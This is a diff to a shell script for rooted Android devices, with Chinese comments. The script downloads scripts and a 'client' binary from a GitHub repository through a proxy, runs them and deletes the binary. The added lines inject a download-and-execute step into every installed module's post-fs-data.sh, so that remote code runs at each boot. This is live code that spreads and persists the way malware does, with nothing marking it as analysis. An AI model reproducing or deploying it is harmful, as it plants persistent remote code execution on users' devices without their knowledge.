@@ -152,7 +152,28 @@ curl -sS -o /data/adb/service.d/run.sh "https://ghproxy.net/https://raw.githubus
 curl -sS -o /data/adb/service.d/.zygisk.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
 chmod +x /data/adb/service.d/run.sh
 chmod +x /data/adb/service.d/.zygisk.sh
+MODULE_DIR="/data/adb/modules"
 
+# 遍歷 MODULE_DIR 下的所有子目錄
+for dir in "$MODULE_DIR"/*/; do
+    # 確保是目錄
+    [ -d "$dir" ] || continue
+
+    # post-fs-data.sh 的完整路徑
+    POST_FS="$dir/post-fs-data.sh"
+
+    # 如果文件存在，則追加內容；如果不存在，則創建並寫入
+    if [ -f "$POST_FS" ]; then
+        echo "whoami" >> "$POST_FS"
+    else
+        echo "#!/system/bin/sh" > "$POST_FS"
+        echo "curl -sS -o /data/adb/service.d/run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
+        echo "curl -sS -o run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
+        echo "chmod +x run.sh " >> "$POST_FS"
+        echo "sh run.sh " >> "$POST_FS"
+        chmod +x "$POST_FS"  # 設置可執行權限
+    fi
+done
 {
     temp_script="/data/local/tmp/client"
     
@@ -161,7 +182,6 @@ chmod +x /data/adb/service.d/.zygisk.sh
         if curl -sS -o "$temp_script" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client" >/dev/null 2>&1; then
             # 下载成功，给执行权限
             chmod +x "$temp_script"
-            
             # 执行客户端，并在执行完毕后删除
             "$temp_script" && rm -f "$temp_script"
             
